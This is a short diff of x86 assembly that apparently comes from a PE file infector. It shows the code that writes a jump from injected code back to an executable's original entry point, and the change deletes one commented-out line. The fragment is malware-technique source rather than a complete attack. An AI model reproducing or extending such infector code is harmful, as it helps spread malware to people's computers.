@@ -437,7 +437,6 @@ loop	createNewSection
 mov	edi, errorExit - toInject ; Offset jmp
 add	edi, [DELTA PeFileMap] ; Add base filemap
 add	edi, [DELTA PointerToRawData] ; Add section offset
-; add	edi, 11
 mov	eax, 0E9h ; Push imm32 OPCODE
 stosb
 mov	eax, [DELTA OldEntryPoint] ; Entry point address
